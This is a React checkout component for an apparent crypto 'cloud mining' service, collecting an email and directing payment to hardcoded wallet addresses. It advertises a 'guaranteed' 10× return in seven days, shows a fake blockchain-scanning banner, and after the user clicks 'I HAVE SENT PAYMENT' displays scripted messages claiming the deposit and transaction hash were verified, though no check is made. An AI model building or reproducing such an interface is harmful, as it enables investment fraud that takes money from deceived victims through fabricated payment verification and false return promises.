"use client";

import React, { useState, useEffect, useMemo, useCallback } from "react";
import { useRouter } from "next/navigation";
import { MiningMode } from "../config/mining";
import { useMiningStore } from "../store/useMiningStore";
import { COINS } from "../config/coins";

interface PlanEmailModalProps {
  plan: MiningMode | null;
  isOpen: boolean;
  onClose: () => void;
}

type PaymentCoin = "usdt" | "btc" | "eth" | "sol" | "usdc";

const PAYMENT_OPTIONS: Record<
  PaymentCoin,
  {
    name: string;
    symbol: string;
    network: string;
    address: string;
    price: number;
    badge?: string;
    icon: string;
  }
> = {
  usdt: {
    name: "Tether (TRC-20)",
    symbol: "USDT",
    network: "Tron (TRC-20)",
    address: "TNaZbM2KpomzDT9PRufvyRcFH1EBtTmgCo",
    price: 1.0,
    badge: "Recommended · 0% Gas",
    icon: "https://cdn.brandfetch.io/idpu_p285y/theme/light/symbol.svg?c=1bxeo22dfwv2aavbiluvm033f4zNejqr--q",
  },
  btc: {
    name: "Bitcoin",
    symbol: "BTC",
    network: "Bitcoin Native SegWit",
    address: "bc1qagvkz7ad8uqp62hwd5pztgxv82zan3wcjr2ft4",
    price: 77958,
    icon: "https://cdn.brandfetch.io/idkbqeYUg6/theme/dark/symbol.svg?c=1bxeo22dfwv2aavbiluvm033f4zNejqr--q",
  },
  eth: {
    name: "Ethereum (ERC-20)",
    symbol: "ETH",
    network: "Ethereum Mainnet",
    address: "0x169C339370E67C03e84787d8eC402dd89d94b51D",
    price: 2143,
    icon: "https://cdn.brandfetch.io/idhZINDHvW/theme/dark/logo.svg?c=1bxeo22dfwv2aavbiluvm033f4zNejqr--q",
  },
  sol: {
    name: "Solana",
    symbol: "SOL",
    network: "Solana Network",
    address: "3vwAi8FEGcerD4yfQHBFFKx4FvRzPDNMGeVRZe3qoEzj",
    price: 86.96,
    badge: "Fastest (~3s)",
    icon: "https://cdn.brandfetch.io/ide0NUuTHO/theme/light/symbol.svg?c=1bxeo22dfwv2aavbiluvm033f4zNejqr--q",
  },
  usdc: {
    name: "USD Coin",
    symbol: "USDC",
    network: "Ethereum (ERC-20)",
    address: "0x169C339370E67C03e84787d8eC402dd89d94b51D",
    price: 1.0,
    icon: "https://cdn.brandfetch.io/iduqAVaA_O/theme/dark/symbol.svg?c=1bxeo22dfwv2aavbiluvm033f4zNejqr--q",
  },
};

function playSoundChime() {
  if (typeof window === "undefined") return;
  try {
    const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioCtx) return;
    const ctx = new AudioCtx();
    const now = ctx.currentTime;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(523.25, now);
    osc.frequency.setValueAtTime(659.25, now + 0.12);
    osc.frequency.setValueAtTime(783.99, now + 0.24);
    osc.frequency.setValueAtTime(1046.5, now + 0.36);
    gain.gain.setValueAtTime(0.2, now);
    gain.gain.exponentialRampToValueAtTime(0.001, now + 1.1);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start(now);
    osc.stop(now + 1.15);
  } catch {}
}

export default function PlanEmailModal({ plan, isOpen, onClose }: PlanEmailModalProps) {
  const router = useRouter();

  // Multi-step: 1 = Email Signup, 2 = Payment Sheet, 3 = Verification / Provisioning
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");

  const [selectedCoin, setSelectedCoin] = useState<PaymentCoin>("usdt");
  const [copiedType, setCopiedType] = useState<"address" | "amount" | null>(null);
  const [timeLeft, setTimeLeft] = useState(900); // 15:00 minutes

  // Step 3 animation states
  const [verificationStage, setVerificationStage] = useState(0);

  const setUserEmail = useMiningStore((s) => s.setUserEmail);
  const setPlanPaid = useMiningStore((s) => s.setPlanPaid);
  const existingEmail = useMiningStore((s) => s.userEmail);

  // Reset state and pre-fill email only ONCE when modal is opened
  useEffect(() => {
    if (isOpen) {
      setStep(1);
      setError("");
      setCopiedType(null);
      setTimeLeft(900);
      setVerificationStage(0);
      setEmail(existingEmail || "");
    }
  }, [isOpen, existingEmail]);

  // 15-minute countdown timer on Step 2
  useEffect(() => {
    if (step !== 2) return;
    const interval = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [step]);

  // Format timer MM:SS
  const timerDisplay = useMemo(() => {
    const mins = Math.floor(timeLeft / 60);
    const secs = timeLeft % 60;
    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
  }, [timeLeft]);

  const activeOption = PAYMENT_OPTIONS[selectedCoin];

  // Calculate exact crypto amount
  const cryptoAmount = useMemo(() => {
    if (!plan) return "0";
    const amount = plan.priceUsd / activeOption.price;
    if (activeOption.symbol === "BTC") return amount.toFixed(6);
    if (activeOption.symbol === "ETH") return amount.toFixed(5);
    if (activeOption.symbol === "SOL") return amount.toFixed(4);
    return amount.toFixed(2);
  }, [plan, activeOption]);

  const handleCopy = useCallback((text: string, type: "address" | "amount") => {
    if (navigator?.clipboard) {
      navigator.clipboard.writeText(text);
      setCopiedType(type);
      setTimeout(() => setCopiedType(null), 2000);
    }
  }, []);

  // Step 1 Submission: Validate email -> Step 2
  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const cleanEmail = email.trim();
    if (!cleanEmail || !cleanEmail.includes("@") || !cleanEmail.includes(".")) {
      setError("Please enter a valid email address");
      return;
    }
    setError("");
    setUserEmail(cleanEmail);
    setStep(2);
  };

  // Step 2 Submission: "I Have Sent Payment" -> Step 3 Verification
  const handleConfirmPayment = () => {
    setStep(3);
    setVerificationStage(1);

    setTimeout(() => {
      setVerificationStage(2);
    }, 1200);

    setTimeout(() => {
      setVerificationStage(3);
      playSoundChime();
    }, 2400);

    setTimeout(() => {
      if (plan) {
        setPlanPaid(true, plan.tierIndex);
      }
      onClose();
      router.push("/dashboard");
    }, 3800);
  };

  if (!isOpen || !plan) return null;

  return (
    <div className="plan-modal-overlay" onClick={step === 3 ? undefined : onClose}>
      <div className="plan-modal-card checkout-card" onClick={(e) => e.stopPropagation()}>
        {step !== 3 && (
          <button className="plan-modal-close" onClick={onClose} aria-label="Close modal">
            ✕
          </button>
        )}

        {/* ─── STEP 1: EMAIL SIGNUP ─── */}
        {step === 1 && (
          <div className="checkout-step-container">
            <div className="plan-modal-header">
              <span className="plan-badge-inline">{plan.badge || "CLOUD RIG"}</span>
              <h3 className="plan-modal-title">Allocate Mining Node</h3>
              <p className="plan-modal-sub">
                Deploying <strong style={{ color: "#ffae19" }}>{plan.name}</strong> (${plan.priceUsd} plan · mines{" "}
                <strong style={{ color: "#22c55e" }}>${plan.targetUsd.toLocaleString()}</strong> in 7 days).
              </p>
            </div>

            <form onSubmit={handleEmailSubmit} className="plan-modal-form">
              <div className="plan-input-group">
                <label htmlFor="planUserEmail">Enter your Email Address</label>
                <div className="plan-email-input-wrap">
                  <input
                    id="planUserEmail"
                    type="email"
                    placeholder="e.g. miner@domain.com"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (error) setError("");
                    }}
                    autoFocus
                    required
                  />
                  {email && (
                    <button
                      type="button"
                      className="plan-email-clear-btn"
                      onClick={() => {
                        setEmail("");
                        const el = document.getElementById("planUserEmail");
                        if (el) el.focus();
                      }}
                      aria-label="Clear email"
                    >
                      ✕
                    </button>
                  )}
                </div>
                {error && <span className="plan-input-error">{error}</span>}
              </div>

              <div className="plan-modal-specs">
                <div className="pms-row">
                  <span>Cloud Rig Hardware:</span>
                  <strong>{plan.rigHardware}</strong>
                </div>
                <div className="pms-row">
                  <span>Hash Power Allocated:</span>
                  <strong style={{ color: "#ffae19" }}>{plan.hashrateDisplay}</strong>
                </div>
                <div className="pms-row">
                  <span>Guaranteed 7-Day Output:</span>
                  <strong style={{ color: "#22c55e" }}>${plan.targetUsd.toLocaleString()} (10× Return)</strong>
                </div>
              </div>

              <button type="submit" className="plan-modal-submit">
                CONTINUE TO PAYMENT (${plan.priceUsd}) →
              </button>
            </form>

            <p className="plan-modal-footer-note">
              No password or KYC required. Your email is your node identifier and payout notification channel.
            </p>
          </div>
        )}

        {/* ─── STEP 2: INSTANT CRYPTO CHECKOUT ─── */}
        {step === 2 && (
          <div className="checkout-step-container">
            <div className="checkout-nav-bar">
              <button type="button" className="checkout-back-link" onClick={() => setStep(1)}>
                ← Change Email
              </button>
              <div className="checkout-timer-pill" title="Locked conversion rate">
                <span className="timer-dot" />
                <span>Rate Locked: {timerDisplay}</span>
              </div>
            </div>

            {/* Plan & Amount Summary Bar */}
            <div className="checkout-summary-bar">
              <div className="csb-left">
                <span className="csb-plan-name">{plan.name}</span>
                <span className="csb-email-meta">Node: {email}</span>
              </div>
              <div className="csb-right">
                <span className="csb-usd-amount">${plan.priceUsd}.00</span>
                <span className="csb-label">Plan Fee</span>
              </div>
            </div>

            {/* Asset Selector Pills */}
            <div className="checkout-asset-selector">
              <label className="cas-label">Select Payment Cryptocurrency</label>
              <div className="cas-pills-row">
                {(Object.keys(PAYMENT_OPTIONS) as PaymentCoin[]).map((coinKey) => {
                  const opt = PAYMENT_OPTIONS[coinKey];
                  const isSelected = selectedCoin === coinKey;
                  return (
                    <button
                      key={coinKey}
                      type="button"
                      className={`cas-pill ${isSelected ? "selected" : ""}`}
                      onClick={() => setSelectedCoin(coinKey)}
                    >
                      <img src={opt.icon} alt={opt.symbol} className="cas-pill-icon" />
                      <span className="cas-pill-symbol">{opt.symbol}</span>
                      {opt.badge && <span className="cas-pill-badge">{opt.badge}</span>}
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Payment Details Container */}
            <div className="checkout-details-container">
              {/* 1. Exact Amount Card */}
              <div className="cdb-amount-card">
                <div className="cdb-amount-header">
                  <span className="cdb-section-label">Exact Amount to Send</span>
                  <span className="cdb-usd-equiv">≈ ${plan.priceUsd}.00 USD</span>
                </div>
                <div className="cdb-amount-action-row">
                  <div className="cdb-amount-display">
                    <span className="cad-value">{cryptoAmount}</span>
                    <span className="cad-symbol">{activeOption.symbol}</span>
                  </div>
                  <button
                    type="button"
                    className={`cdb-copy-pill ${copiedType === "amount" ? "copied" : ""}`}
                    onClick={() => handleCopy(cryptoAmount, "amount")}
                  >
                    {copiedType === "amount" ? "✓ Copied" : "Copy"}
                  </button>
                </div>
              </div>

              {/* 2. QR Code Box */}
              <div className="cdb-qr-card">
                <img
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(
                    activeOption.address
                  )}&color=ffae19&bgcolor=080d1a`}
                  alt="Payment QR"
                  className="cdb-qr-img"
                />
                <span className="cdb-qr-caption">Scan to pay with any crypto wallet</span>
              </div>

              {/* 3. Deposit Address Card */}
              <div className="cdb-address-card">
                <div className="cdb-address-header">
                  <span className="cdb-section-label">Deposit Address</span>
                  <span className="cdb-network-tag">{activeOption.network}</span>
                </div>

                <div className="cdb-address-box" onClick={() => handleCopy(activeOption.address, "address")}>
                  <code className="cdb-address-text">{activeOption.address}</code>
                </div>

                <button
                  type="button"
                  className={`cdb-copy-address-btn ${copiedType === "address" ? "copied" : ""}`}
                  onClick={() => handleCopy(activeOption.address, "address")}
                >
                  {copiedType === "address" ? (
                    <>
                      <span>✓</span>
                      <span>Address Copied to Clipboard</span>
                    </>
                  ) : (
                    <>
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2">
                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                      </svg>
                      <span>Copy Deposit Address</span>
                    </>
                  )}
                </button>
              </div>
            </div>

            {/* Blockchain Detection Banner */}
            <div className="checkout-detection-banner">
              <span className="beacon-pulse" />
              <span>Scanning blockchain for incoming {activeOption.symbol} transaction...</span>
            </div>

            {/* Confirm Payment CTA Button */}
            <button type="button" className="checkout-paid-button" onClick={handleConfirmPayment}>
              I HAVE SENT PAYMENT →
            </button>

            <p className="checkout-disclaimer">
              Send only <strong>{activeOption.symbol}</strong> via the <strong>{activeOption.network}</strong>. Your
              datacenter node spins up instantly upon broadcast detection.
            </p>
          </div>
        )}

        {/* ─── STEP 3: HIGH-TECH VERIFICATION & PROVISIONING STATE ─── */}
        {step === 3 && (
          <div className="checkout-step-container step-verification">
            <div className="verify-radar-wrap">
              <div className="verify-radar-circle">
                {verificationStage < 3 ? (
                  <div className="verify-spinner" />
                ) : (
                  <div className="verify-success-check">✓</div>
                )}
              </div>
            </div>

            <h3 className="verify-title">
              {verificationStage === 1 && "Detecting Network Transfer..."}
              {verificationStage === 2 && "Confirming On-Chain Transaction..."}
              {verificationStage === 3 && "Payment Verified! Allocating Node..."}
            </h3>

            <p className="verify-desc">
              {verificationStage === 1 && "Connecting to blockchain mempool to verify deposit..."}
              {verificationStage === 2 && "Deposit verified: 1 confirmation received."}
              {verificationStage === 3 &&
                `Initializing ${plan.name} (${plan.hashrateDisplay}) in GovCloud Datacenter...`}
            </p>

            <div className="verify-terminal">
              <div className="vt-line">[00:01] Listening to {activeOption.network} network node...</div>
              {verificationStage >= 2 && (
                <div className="vt-line green">[00:02] TxHash found: Deposit verified for {email}</div>
              )}
              {verificationStage >= 3 && (
                <div className="vt-line yellow">
                  [00:03] Node provisioned: Cluster US-East assigned · 10× yield unlocked
                </div>
              )}
            </div>

            <div className="verify-progress-bar">
              <div
                className="verify-progress-fill"
                style={{
                  width: verificationStage === 1 ? "40%" : verificationStage === 2 ? "75%" : "100%",
                }}
              />
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
